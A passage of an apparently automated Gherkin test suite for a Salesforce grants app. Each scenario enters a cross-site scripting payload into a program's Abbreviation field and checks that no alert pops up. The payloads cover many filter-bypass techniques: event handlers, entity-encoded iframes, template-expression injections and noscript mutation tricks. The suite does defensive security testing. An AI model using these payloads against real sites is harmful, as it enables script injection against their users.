      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301364 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x :[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301365 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x #[_c.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301367 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301368 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301369 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                           | Field                |
      | <xyz<img/src onerror=alert(1)>> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301370 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                | Field                |
      | <svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301388 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301391 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{$el.ownerDocument.defaultView.alert(1)}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301409 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | {{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301420 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                        | Field                |
      | <img src @error=e=$event.path.pop().alert(1) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301428 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <img src @error=e=$event.composedPath().pop().alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301431 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <img src @error=this.alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301437 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <svg@load=this.alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301438 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301468 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | {{_openBlock.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301482 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{_createBlock.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301485 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | {{_toDisplayString.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301487 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
